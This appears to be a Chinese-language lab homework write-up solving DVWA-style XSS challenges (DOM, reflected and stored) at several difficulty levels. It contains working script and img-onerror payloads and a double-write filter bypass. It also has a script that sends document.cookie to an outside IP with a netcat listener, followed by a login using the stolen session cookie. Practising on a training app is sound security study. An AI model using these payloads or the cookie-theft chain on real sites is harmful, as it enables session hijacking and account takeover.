# 1 xss dom

## low

![image-20250827190958150](images/image-20250827190958150.png)

#### default有可能是个传参点

```
http://8.148.75.207:55/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E
```

![image-20250827191016233](images/image-20250827191016233.png)



## mid

```
http://8.148.75.207:55/vulnerabilities/xss_d/?default=%3Cimg%20src=#%20onerror=alert(1)%3E
```

![image-20250827191529384](images/image-20250827191529384.png)



## high

```
http://8.148.75.207:55/vulnerabilities/xss_d/?default=Spanish#%3Cscript%3Ealert(1)%3C/script%3E
```

![image-20250827191803204](images/image-20250827191803204.png)



# xss(reflected)

## low

```
http://8.148.75.207:55/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
```

![image-20250827192026124](images/image-20250827192026124.png)

## mid

```
http://8.148.75.207:55/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E
```

![image-20250827192133605](images/image-20250827192133605.png)

## high

```
http://8.148.75.207:55/vulnerabilities/xss_r/?name=%3Cimg%20src%20=%201%20onerror%20=%20alert(1)%3E#
```

![image-20250827192617660](images/image-20250827192617660.png)



# xss stored

## low

![image-20250827192856383](images/image-20250827192856383.png)

![image-20250827193003798](images/image-20250827193003798.png)

![image-20250827193027523](images/image-20250827193027523.png)

每次进入网站会弹出来

![image-20250827193058995](images/image-20250827193058995.png)



## mid

##### 删除low的记录

![image-20250827193159912](images/image-20250827193159912.png)

同样先修改字符限制，在写入XSS代码,<script>标签被过滤了

![image-20250827193352011](images/image-20250827193352011.png)

双写解决

```
<scri<script>pt>alert(1)</script>
```

![image-20250827193640965](images/image-20250827193640965.png)

成功弹窗

![image-20250827193718952](images/image-20250827193718952.png)



# high

#### 删除mid记录

```

```

![image-20250827194217614](images/image-20250827194217614.png)

![image-20250827194237528](images/image-20250827194237528.png)



服务器安装nc开启监听

```
sudo apt install netcat-openbsd -y
nc -lvp 8888
```

![image-20250827194704478](images/image-20250827194704478.png)

传本机的cookie到nc机器

```

<script>new Image().src="http://13.75.42.219:8888/?output="+document.cookie;</script>

```

![image-20250827195004192](images/image-20250827195004192.png)

nc机器成功监听到cookie

![image-20250827195531542](images/image-20250827195531542.png)

获取cookie

```
GET /?output=PHPSESSID=59147pmbmgig63dgmdeubu7827;%20security=low HTTP/1.1
```



# 作业三 通过cookie登录

此时新设备登录没有密码

![image-20250827200736809](images/image-20250827200736809.png)

hackback构造cookie成功登录进去

![image-20250827204605959](images/image-20250827204605959.png)